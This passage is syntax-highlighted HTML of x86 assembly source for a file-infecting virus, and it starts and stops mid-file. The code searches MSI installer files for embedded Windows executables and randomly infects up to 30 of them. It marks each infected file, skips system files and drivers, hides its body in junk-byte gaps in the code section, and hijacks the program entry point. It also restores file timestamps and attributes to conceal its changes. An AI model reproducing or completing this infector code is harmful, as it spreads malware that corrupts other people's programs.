    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.WFD_ftLastAccessTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.WFD_ftCreationTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_SetFileTime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;restore the file time</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;handle of the opened file</span><span class="sc0">
</span><span class="sc5">hFile</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_CloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;close file</span><span class="sc0">
    
</span><span class="sc5">i_error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">aWFD</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.WFD_dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;set back</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;file attributes</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_SetFileAttributesA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc5">c_error</span><span class="sc4">:</span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;and quit</span><span class="sc0">

</span><span class="sc5">nOpen</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pe_msi</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">msi_search</span><span class="sc0">        </span><span class="sc1">;semaphore, 0 if MSI, otherwise its PE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mz_search</span><span class="sc0">          </span><span class="sc1">;it is PE</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">closeFile</span><span class="sc0">            </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_mz</span><span class="sc0">          </span><span class="sc1">;try to infect PE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">closeFile</span><span class="sc0">           </span><span class="sc1">;close file and quit</span><span class="sc0">

</span><span class="sc5">msi_search</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E011CFD0h</span><span class="sc0">       </span><span class="sc1">;check the MSI header</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">closeFile</span><span class="sc0">           </span><span class="sc1">;it aint MSI, quit</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E11AB1A1h</span><span class="sc0">     </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">closeFile</span><span class="sc0">           </span><span class="sc1">;...</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0">             </span><span class="sc1">;try to infect 30 PE files</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;counter as ECX</span><span class="sc0">
</span><span class="sc5">infect_msi</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">;store counter</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mz_search</span><span class="sc0">          </span><span class="sc1">;check the file</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_msi</span><span class="sc0">          </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_random</span><span class="sc0">         </span><span class="sc1">;get random number 0-1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_msi</span><span class="sc0">          </span><span class="sc1">;dont infect this PE if ZERO</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_mz</span><span class="sc0">          </span><span class="sc1">;and try to infect it</span><span class="sc0">
</span><span class="sc5">end_msi</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;restore counter</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;get possition</span><span class="sc0">
</span><span class="sc5">pos</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;increment it</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">infect_msi</span><span class="sc0">         </span><span class="sc1">;and continue with searching</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">closeFile</span><span class="sc0">           </span><span class="sc1">;close the MSI file</span><span class="sc0">

</span><span class="sc5">mz_search</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">              </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">e_mz</span><span class="sc4">&gt;</span><span class="sc0">  </span><span class="sc1">;setup SEH frame</span><span class="sc0">
</span><span class="sc5">r_byte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pos</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">   </span><span class="sc1">;save the possition</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get two bytes</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">       </span><span class="sc1">;is it "MZ"?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">n_byte</span><span class="sc0">          </span><span class="sc1">;nope, try next bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">aWFD</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get address of WFD</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;is the pointer valid?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">n_byte</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">;get to PE header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;get four bytes</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"EP"</span><span class="sc0">       </span><span class="sc1">;is it PE\0\0?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">n_byte</span><span class="sc0">          </span><span class="sc1">;no, try next bytes</span><span class="sc0">
</span><span class="sc5">end_mz</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;save EDX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">;save ESI</span><span class="sc0">
    </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">        </span><span class="sc1">;remove SEH frame</span><span class="sc0">
</span><span class="sc5">q_null</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">               </span><span class="sc1">;restore all registers</span><span class="sc0">
</span><span class="sc5">e_ret</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">e_mz</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">;set the flag</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_mz</span><span class="sc0">          </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">n_byte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;increment possition</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">r_byte</span><span class="sc0">          </span><span class="sc1">;and continue searching</span><span class="sc0">

</span><span class="sc5">infect_mz</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;ESI - start of MZ</span><span class="sc0">
    </span><span class="sc1">;EDX - start of PE</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_FileHeader.FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get to section header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">;VirtualSize mustnt be smaller</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">e_ret</span><span class="sc0">            </span><span class="sc1">;than SizeOfRawData</span><span class="sc0">

    </span><span class="sc1">;EBX - start of .text section</span><span class="sc0">
    </span><span class="sc1">;ESI - start of code</span><span class="sc0">
    </span><span class="sc1">;EDI - size of code</span><span class="sc0">

</span><span class="sc5">HOW_MANY_BYTES</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">virtual_end</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">  </span><span class="sc1">;how big hole in file do we need</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">              </span><span class="sc1">;store all registers</span><span class="sc0">
</span><span class="sc5">no_null</span><span class="sc4">:</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">;set the counter to zero</span><span class="sc0">
</span><span class="sc5">null</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;decrement counter</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">           </span><span class="sc1">;end of file?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">q_null</span><span class="sc0">           </span><span class="sc1">;yeah, quit</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">is_null</span><span class="sc0">            </span><span class="sc1">;check for garbage byte</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">no_null</span><span class="sc0">           </span><span class="sc1">;no garbage, try next byte</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;yeah, increment counter</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HOW_MANY_BYTES</span><span class="sc0">     </span><span class="sc1">;have we enough garbage bytes?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0">            </span><span class="sc1">;nope, find another</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HOW_MANY_BYTES</span><span class="sc0">     </span><span class="sc1">;get to the beginning</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">   </span><span class="sc1">;save the pointer</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">               </span><span class="sc1">;restore all registers</span><span class="sc0">

</span><span class="sc1">;at this point:</span><span class="sc0">
</span><span class="sc1">;   EAX - address of MZ header (inside MSI file)</span><span class="sc0">
</span><span class="sc1">;   EBX - address of the first section header (.text)</span><span class="sc0">
</span><span class="sc1">;   ECX - address of mapped MSI file</span><span class="sc0">
</span><span class="sc1">;   EDX - address of PE header</span><span class="sc0">
</span><span class="sc1">;   EDI - address of junk code which can be patched</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_FileHeader.FH_Machine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">endInfection</span><span class="sc0">        </span><span class="sc1">;must be 386+</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_FileHeader.FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0">    </span><span class="sc1">;must be executable image</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">endInfection</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_SYSTEM</span><span class="sc0">  </span><span class="sc1">;mustnt be system file</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">endInfection</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader.OH_MinorLinkerVersion</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">endInfection</span><span class="sc0">         </span><span class="sc1">;check, if the file is already infected</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader.OH_Subsystem</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SUBSYSTEM_NATIVE</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">endInfection</span><span class="sc0">        </span><span class="sc1">;mustnt be driver</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">;get to the entrypoint in the file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">endInfection</span><span class="sc0">     </span><span class="sc1">;check if the entrypoint is the same location as</span><span class="sc0">
                </span><span class="sc1">;the hole in the file</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">virtual_end</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">endInfection</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrigEPPtr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;save the pointer to EP</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrigBytes</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;save the saved bytes</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrigBytes</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;save the fifth one</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader.OH_ImageBase</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;EAX=entrypoint VA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrigEPPtr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">               </span><span class="sc1">;get to entrypoint in RAW file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrigBytes</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;save first five bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
